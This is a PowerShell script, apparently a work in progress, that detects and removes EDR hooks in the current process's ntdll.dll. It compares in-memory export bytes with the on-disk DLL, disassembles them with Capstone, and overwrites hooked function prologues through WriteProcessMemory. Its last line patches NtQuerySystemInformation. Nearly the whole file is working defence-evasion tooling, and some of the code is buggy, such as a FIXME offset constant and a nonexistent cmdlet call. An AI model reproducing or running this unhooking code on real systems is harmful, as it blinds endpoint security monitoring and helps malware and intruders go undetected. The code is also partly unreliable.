# win functions, read, write, process
import-module .\PSReflect-Functions\PSReflect-Functions.psm1
# in user module
import-module .\capstone\capstone.psm1
import-module .\PowerShellArsenal\PowerShellArsenal.psm1
import-module .\PowerShell-Suite\Get-Exports.ps1
# import-module .\PowerShell-Suite\Get-handles.ps1


<#

Unhook EDR from this process's kernel syscalls.
1. Look at all modules loaded (or just ntdll)
2. Search for jmp to Kernel space or side loading user library.
3. Identify original lib code
4. replace in memory (this process) code with on disk version.

#>


$DebugPreference = 'Continue'


Class ProcessModulesReader 
{

    [array] $modules = $null
    [int]$processId = $PID
    [int]$_local_process_id = $PID

    ProcessModulesReader([int] $processid)
    {
        $this.processId = $processid
        $this.modules = get-process -id $this.processId | select -expand Modules -ea silentlycontinue | sort -Property BaseAddress
    }


    [void] PrintModules () 
    {
        foreach ($module in $this.modules) {
            $imageBase = [int64]$module.BaseAddress
            $size = [uint64]$module.ModuleMemorySize
            $filename = [IO.Path]::GetFileName($module.Filename)
            [uint64]$endBase = [uint64]$imageBase + [uint64]$size
            Write-Debug ("0x{1:X8} - 0x{2:X8} `t{0}" -f $filename, $imageBase, $endBase)
        }
    }

    [string[]] ListModules () 
    {
        foreach ($module in $this.modules) {
            $imageBase = [int64]$module.BaseAddress
            $size = [uint64]$module.ModuleMemorySize
            $filename = [IO.Path]::GetFileName($module.Filename)
            [uint64]$endBase = [uint64]$imageBase + [uint64]$size
            write-debug ("0x{1:X8} - 0x{2:X8} `t{0}" -f $filename, $imageBase, $endBase)
        }
        return $this.modules
    }

    [object] GetModuleForAddress ([Int64] $address) 
    {
        # Write-Debug ("searching for module at 0x{0:x}" -f $Address)
        # if ( $Address -gt 0xFFFF080000000000) {
        if ( $Address -lt 0) {
            # write-debug $Address
            Write-Debug "GetModuleForAddress: searching for Kernel Driver memory space - aborting"
            return $null
        }

        foreach ($module in $this.modules) {
            $imageBase = [int64]$module.BaseAddress
            $size = [int64]$module.ModuleMemorySize
            $filename = [IO.Path]::GetFileName($module.Filename)
            [int64]$endBase = [int64]$imageBase + [int64]$size
            if ($imageBase -le $Address -and $Address -le $endBase) {
                Write-Debug "Found module at ${filename}"
                return $module
            }
        }
        return $null
    }

    [object] GetModuleForModuleName ([string] $moduleName) 
    {
        foreach ($module in $this.modules) {
            if ($moduleName -eq $module.ModuleName) {
                Write-Debug $moduleName
                return $module
            }
        }
        Write-Error $moduleName
        return $null
    }

    [MemoryModuleAnalyser] GetModuleAnalyzerForAddress ([Int64] $address) 
    {
        $module = $this::GetModuleForAddress($address)
        if ($module -ne $null) {
            Write-Error "Could not find userland module for address {0:x}" -f $address
            exit -1
        }
        $ModuleName = $module.ModuleName
        if ($this.processId -eq $this._local_process_id) {
            $ProcessHandle = GetCurrentProcess
        } else {
            # FIXME we are not ready for this
            $ProcessHandle = OpenProcess $this.processId
            Write-Error "Not implemented"
            exit -1
        }
        return [MemoryModuleAnalyser]::new($this, $ProcessHandle, $module)
    }

    [MemoryModuleAnalyser] GetModuleAnalyzerForModule ([object] $module) 
    {
        $ModuleName = $module.ModuleName
        if ($this.processId -eq $this._local_process_id) {
            $ProcessHandle = GetCurrentProcess
        } else {
            # FIXME we are not ready for this
            $ProcessHandle = OpenProcess $this.processId
            Write-Error "Not implemented"
            exit -1
        }
        return [MemoryModuleAnalyser]::new($this, $ProcessHandle, $module)
    }

    [void] WriteMemory([int64] $address, [byte[]] $bytes)
    {
        $ProcessHandle = GetCurrentProcess
        $res = WriteProcessMemory -ProcessHandle $ProcessHandle -BaseAddress $address -Buffer $bytes
    }
}


Class MemoryModuleAnalyser
{
    <#

    #>
    [ProcessModulesReader] $parent
    [IntPtr] $ProcessHandle
    # the get-process module
    [object] $module
    # the handle to the module
    [IntPtr] $hModule = 0


    MemoryModuleAnalyser([ProcessModulesReader] $parent, [IntPtr] $ProcessHandle, [object] $module)
    {
        $this.parent = $parent
        $this.ProcessHandle = $ProcessHandle
        $this.module = $module
        # we are interested in  module RVA
        # $this.this_modules = get-process -id $PID| select -expand Modules -ea silentlycontinue | sort -Property BaseAddress
        # TODO we pretend we are always working on local process
        # $this.this_modules = $parent.modules
    }


    [object] GetAddressForFunction([String] $FunctionName)
    {
        <# Load module in local process, and get Proc Address from local process.
           Look at base address in $this.modules ( use parent fn) 
        #>
        if ($FunctionName -eq $null) {Write-Error "FunctionName is null"; exit -1}
        if ($this.hModule -eq 0) {
            # it's already loaded, but we need a handle
            $this.hModule = LoadLibrary -ModuleName $this.module.ModuleName
        }
        $ProcAddr = GetProcAddress -ModuleHandle $this.hModule -FunctionName $FunctionName
        $_moduleName = $this.ModuleName
        #Write-Debug ("Proc ${_moduleName}.${functionName} is at 0x{0:x}" -f $ProcAddr.ToInt64())
        [hashtable] $res = @{}
        $res.Add("AbsoluteAddress", $ProcAddr.ToInt64())
        # Check that ProcAddr in module
        $res.Add("BaseAddress", $this.module.BaseAddress.ToInt64())
        $res.Add("EntryPointAddress", $this.module.EntryPointAddress.ToInt64())
        $res.Add("ModuleMemorySize", $this.module.ModuleMemorySize)
        $RVA = $ProcAddr.ToInt64() - $this.module.BaseAddress.ToInt64()
        $res.Add("RVA", $RVA)

        #Write-Debug("BaseAddress 0x{0:x}" -f $this.module.BaseAddress.ToInt64())
        #Write-Debug("EntryPointAddress 0x{0:x}" -f $this.module.EntryPointAddress.ToInt64())
        #Write-Debug("ModuleMemorySize 0x{0:x}" -f $this.module.ModuleMemorySize)
        #Write-Debug("RVA 0x{0:x}" -f $RVA)
        
        return New-Object -TypeName psobject -Property $res
    }

    [byte[]] GetFunctionFirstBytes([String] $FunctionName,[Int] $Size  = 32)
    {
        if ($FunctionName -eq $null) {Write-Error "FunctionName is null"; exit -1}
        $ProcAddr = $this.GetAddressForFunction($FunctionName)
        $data = $this.GetAbsoluteAddressFirstBytes($ProcAddr.AbsoluteAddress, $Size)
        return $data
    }

    [byte[]] GetAbsoluteAddressFirstBytes([Int64] $AbsoluteAddress, [Int] $Size  = 32)
    {
        $data = ReadProcessMemory -Process $this.ProcessHandle -Base $AbsoluteAddress -Size $Size
        return $data
    }

    [object] GetFirstBytesASMForFunction([String] $FunctionName, [Int] $Size  = 32)
    {
        if ($FunctionName -eq $null) {Write-Error "FunctionName is null"; exit -1}
        $data = $this.GetFunctionFirstBytes($FunctionName, $Size)
        # FIXME arch & mode
        $Object = Get-CapstoneDisassembly -Architecture CS_ARCH_X86  -Mode CS_MODE_64 -Bytes $data -Detailed
        return $object
    }

}

# Vars - check in memory
$processPID = $PID
$currentProcess = GetCurrentProcess
$moduleName = "ntdll.dll"
$functionName = "NtReadVirtualMemory"

# Vars in file
$FileModulePath = "C:\Windows\System32\ntdll.dll"

$reader = [ProcessModulesReader]::new($processPID)
#$reader.PrintModules() # ok
#$reader.ListModules() # ok
$modules = $reader.modules

# $modAnalyzer = [MemoryModuleAnalyser]::new($currentProcess, $moduleName)
# $modAnalyzer = $reader.GetModuleAnalyzerForAddress(???)
$module = $reader.GetModuleForModuleName($moduleName)
if ($module -eq $null) {
    Write-Error "Module ${moduleName} not found"
    exit -1
}
$modAnalyzer = $reader.GetModuleAnalyzerForModule($module)
$addr = $modAnalyzer.GetAddressForFunction($functionName)
if ($addr -eq $null) {
    Write-Error "Address {0:x} not found" -f $addr
    exit -1
}
# $module = $reader.GetModuleForAddress($addr)

# this is the address in the local process, for this module
Write-Debug("Address RVA {0:x} is for Module {1}" -f $addr.RVA, $module)



# $Bytes = [byte[]] @( 0xB8, 0x0A, 0x00, 0x00, 0x00, 0xF7, 0xF3 )
# $Object = Get-CapstoneDisassembly -Architecture CS_ARCH_X86 -Mode CS_MODE_32 -Bytes $Bytes -Detailed
# $Object | Select-Object -Property Size, Mnemonic, Operands | ft
# Get-CapstoneDisassembly -Architecture CS_ARCH_X86 -Mode CS_MODE_32 -Bytes $Bytes -Detailed


#$proc_address = GetProcAddress 


# Import-Module .\PSReflect-Functions\Enumerations\TH32CS.ps1
# $flags = [TH32CS]::SNAPMODULE
# $handle = CreateToolhelp32Snapshot -processid 0 -flags $flags
# Thread32First $handle
# CloseHandle $handle


######### Filesystem info

class FileSystemModuleAnalyzer
{
    [string] $FileModulePath
    [object]$pe_info
    [object[]]$exports

    FileSystemModuleAnalyzer([string] $FileModulePath)
    {
        $this.FileModulePath = $FileModulePath
        $this.pe_info = Get-Pe -filepath $FileModulePath
        $this.exports = ($this.pe_info.exports | Sort -property RVA)
    }

    [object[]] GetExports ()
    {
        return $this.exports
    }

    [object] GetFunctionForAddress ([Int64] $address) 
    {
        Write-Debug ("GetFunctionForAddress: searching for function at 0x{0:x}" -f $Address)
        [hashtable]$objHash = @{}
        # sorted
        $next_export = $null
        for( $i=0; $i -lt $this.exports.Length; $i++) {
            $export = $this.exports[$i]
            $next_export = $this.exports[$i+1]
            if ( $next_export.RVA -eq $export.RVA ) {
                # skip aliases
                $next_export = $this.exports[$i+2]
            }
            $RVABase = [int64]$export.RVA
            $RVAEnd = [int64]$next_export.RVA
            $FunctionName = $export.FunctionName
            # not really true, as there are some non-exported functions
            if ($RVABase -le $address -and $address -lt $RVAEnd) {
                Write-Debug ("GetFunctionForAddress: Found address in export "+ $FunctionName+" base:" + $RVABase + " end:" + $RVAEnd)
                $objHash.Add("RVA", $RVABase)
                $objHash.Add("NextRVA", $RVAEnd)
                $objHash.Add("FunctionName", $FunctionName)
                return New-Object -TypeName psobject -Property $objHash
            }
        }
        return $null
    }

    [object] GetExportForFunctionName ([string] $FunctionName) 
    {
        if ($FunctionName -eq $null) {Write-Error "FunctionName is null"; exit -1}
        # Write-Debug ("GetRVAForFunction: searching address for Function " + $FunctionName)
        # sorted
        for( $i=0; $i -le $this.exports.Length; $i++) {
            $export = $this.exports[$i]
            if ( $FunctionName -eq $export.FunctionName) {
                return $export
            }
        }
        return $null
    }

    [byte[]] GetFunctionFirstBytes([String] $FunctionName, [Int] $Size  = 32)
    {
        if ($FunctionName -eq $null) {Write-Error "FunctionName is null"; exit -1}

        $FIXME_CONST = 0xc00
        $addr = $this.GetExportForFunctionName($FunctionName)
        $rvm_address = $addr.RVA - $FIXME_CONST 
        $rvm_end = $addr.RVA - $FIXME_CONST + $Size -1

        ### Read filesystem code byte
        # write-debug ("RVA is 0x{0:x}" -f $rvm_address) 
        $content = [System.IO.File]::ReadAllBytes($this.FileModulePath)
        $bytes = $content[$rvm_address..$rvm_end]
        return $bytes
    }

    [object] GetFirstBytesASMForFunction([String] $FunctionName, [Int] $Size  = 32)
    {
        if ($FunctionName -eq $null) {Write-Error "FunctionName is null"; exit -1}
        $bytes = $this.GetFunctionFirstBytes($FunctionName, $Size)
        $result = Get-CapstoneDisassembly -Architecture CS_ARCH_X86  -Mode CS_MODE_64 -Bytes $bytes -Detailed
        return $result
    }
}


Function FindHooks ([string] $moduleName)
{
    # for each exports in this module, check if fs differs from memory
    [string[]]$hooks = @()

    $fsModuleAnalyzer = [FileSystemModuleAnalyzer]::new($FileModulePath)
    $reader = [ProcessModulesReader]::new($PID)
    if ($reader  -eq $null) {Write-error "Error creating ProcessModulesReader"; exit -1}
    $module = $reader.GetModuleForModuleName($moduleName)
    $analyzer = $reader.GetModuleAnalyzerForModule($module)

    # run 
    Write-Debug("Checking for Hooks in ${moduleName}")
    $fsModuleAnalyzer.exports | ForEach-Object {
        $FunctionName = $_.FunctionName
        if ($FunctionName -eq $null -or $FunctionName -eq "") {
            Write-Debug ("Ignoring ${_}")
        } else {
            #if (! $FunctionName.StartsWith("Nt")) {
                # Write-Debug "Ignoring ${FunctionName}" 
            #} else {
                # Write-Debug "Checking ${FunctionName}"
                #$addr = $analyzer.GetAddressForFunction($FunctionName)
                #if ($addr -eq $null) {
                #    Write-Error ("FunctionName ${FunctionName} Address {0:x} not found" -f $addr)
                #    exit -1
                #}

                # check byte code
                $object_bytes = $analyzer.GetFunctionFirstBytes($functionName, 32)
                #$object_bytes | Format-Hex
                $object_fs_bytes = $fsModuleAnalyzer.GetFunctionFirstBytes($functionName, 32)
                #$object_fs_bytes | Format-Hex
                if ($object_fs_bytes -eq $null) {
                    write-Error "Error pulling bytes from filesystem"
                    return
                } 

                if ([STRING]$object_bytes -eq [STRING]$object_fs_bytes) {                    
                    return
                }
                write-debug("Probable HOOK on ${FunctionName}")

                # get asm from memory
                $object = $analyzer.GetFirstBytesASMForFunction($functionName, 32) 
                if ($object -eq $null) {
                    write-Error "Error pulling ASM from memory"
                }
                # $Object | Mnemonic-Object -Property Size, Mnemonic, Operands | ft
                $ins = $Object[0]
                $m = $ins.Mnemonic
                $o = $ins.Operands
                # check if Mnemonic is jmp
                # Write-Debug "${moduleName}.${FunctionName} First Mnemonic is ${m} ${o}"

                if ($m -eq "jmp" ) {
                    # Betting this is a hook
                    $targetAddress = $o
                    if ( $Address -lt 0) {
                        $aModuleName  = "KERNEL DRIVER"
                    } else {
                        $aModule = $reader.GetModuleForAddress($targetAddress)
                        if ($aModule -eq $null) {
                            # Write-Error ("targetAddress {0:x} returned a null aModule" -f $targetAddress)
                            # probably local code
                            return 
                        } elseif ($aModule -is [string]) {
                            $aModuleName  = $aModule
                        } else {
                            $aModuleName = [IO.Path]::GetFileName($aModule.Filename)
                        }
                    }


                    Write-Debug "MEMORY ${functionName}"
                    $object | Select-Object -Property Size, Mnemonic, Operands | ft
                    Write-Debug "FILESYSTEM ${functionName}"
                    $fsModuleAnalyzer.GetFirstBytesASMForFunction($functionName, 32) | Select-Object -Property Size, Mnemonic, Operands | ft

                    $hooks += $FunctionName
                    Write-Debug ("${moduleName}.${FunctionName} First Mnemonic is ${m} ${targetAddress} to ${aModuleName}")
                        
                } else {
                    Write-Debug("**** unknown hook type")
                    $Object | Mnemonic-Object -Property Size, Mnemonic, Operands | ft
                }

            

        }

    }

    return $hooks
}

Function PatchHook ([string] $moduleName, [string] $FunctionName)
{
    if ($moduleName -eq $null -or $moduleName -eq "") { write-error "moduleName is null"; exit 1}
    if ($FunctionName -eq $null -or $FunctionName -eq "") { write-error "FunctionName is null"; exit 1}
    # run 
    Write-Debug("Patching Hooks in ${moduleName} for $FunctionName")

    $fsModuleAnalyzer = [FileSystemModuleAnalyzer]::new($FileModulePath)
    $reader = [ProcessModulesReader]::new($PID)
    if ($reader  -eq $null) {Write-error "Error creating ProcessModulesReader"; exit -1}
    $module = $reader.GetModuleForModuleName($moduleName)
    $analyzer = $reader.GetModuleAnalyzerForModule($module)

    # check byte code
    $object_fs_bytes = $fsModuleAnalyzer.GetFunctionFirstBytes($functionName, 32)
    #$object_fs_bytes | Format-Hex
    if ($object_fs_bytes -eq $null) {
        write-Error "Error pulling bytes from filesystem"
        return
    } 
    $addr = $analyzer.GetAddressForFunction($FunctionName)
    if ($addr -eq $null) {
        Write-Error "null address"
        exit -1
    }

    Write-Debug "BEFORE"
    $object_bytes = $analyzer.GetFunctionFirstBytes($functionName, 32)
    $object_bytes | Format-Hex

    # PATCH
    $reader.WriteMemory($addr.AbsoluteAddress, $object_fs_bytes)

    Write-Debug "AFTER"

    $object_bytes = $analyzer.GetFunctionFirstBytes($functionName, 32)
    $object_bytes | Format-Hex

}



#              635216    1771 ZwClearEvent                                         
#              635216     257 NtClearEvent                                         
#              635248     521 NtReadVirtualMemory                                  
#              635248    2034 ZwReadVirtualMemory                                  
#              635280    1926 ZwOpenEvent                                          
#              635280     413 NtOpenEvent                                
if ($false) {
    $fsModuleAnalyzer = [FileSystemModuleAnalyzer]::new($FileModulePath)
    # $fsModuleAnalyzer.GetExports() | ft

    # TEST OK
    ##if ($fsModuleAnalyzer.GetFunctionForAddress(-1) -eq $null){
    ##    Write-Debug "GetFunctionForAddress: border test case ok"
    ##}

    #$export = $fsModuleAnalyzer.GetExportForFunctionName($functionName)
    #Write-Debug("Function  {0} is at Address {1:x}" -f $functionName, $export.RVA)

    #$obj = $fsModuleAnalyzer.GetFunctionForAddress($export.RVA)
    #Write-Debug("Address {0:x} is for Function {1}" -f $addr, $obj.FunctionName)
    #Write-Debug("Next RVA is {0:x} " -f $obj.NextRVA)


    # 0x7FF8F8D60000 - 0x7FF8F8F41000 	ntdll.dll
    #$module | select RVA, FunctionName

    # 635248     521 NtReadVirtualMemory  
    # FIXME: why the heck, 0xc00 ?
    # $rvm_address = $addr.RVA -0xc00 # 0x9b170
    # $rvm_end = $addr.RVA -0xc00 + 32


    ### Read filesystem code byte
    #write-debug ("RVA is 0x{0:x}" -f $rvm_address) 
    #$content = [System.IO.File]::ReadAllBytes($FileModulePath)
    #$Bytes = $content[$rvm_address..$rvm_end]
    #$bytes | format-hex
    #$Object = Get-CapstoneDisassembly -Architecture CS_ARCH_X86  -Mode CS_MODE_64 -Bytes $Bytes -Detailed

    Write-Debug "FILESYSTEM ASM for ${ModuleName} ${FunctionName}"

    $object = $fsModuleAnalyzer.GetFirstBytesASMForFunction($functionName, 32)
    $object | Select-Object -Property Size, Mnemonic, Operands | ft

    Write-Debug "MEMORY ASM for ${FunctionName}"

    #$data = Get-ProcFirstBytes -Process $currentProcess -ModuleName $moduleName -FunctionName $functionName -Size 64
    # $data = $modAnalyzer.GetFunctionFirstBytes($FunctionName, 32)
    # $data | Format-Hex
    # $Object = Get-CapstoneDisassembly -Architecture CS_ARCH_X86  -Mode CS_MODE_64 -Bytes $data -Detailed

    $object = $modAnalyzer.GetFirstBytesASMForFunction($FunctionName, 32)
    $object | Select-Object -Property Size, Mnemonic, Operands | ft

    # $m = [Regex]::Match([Text.Encoding]::ASCII.GetString($byteArray), $stringToSearch)
}


# FindHooks("ntdll.dll")
PatchHook -ModuleName "ntdll.dll" -FunctionName "NtQuerySystemInformation"
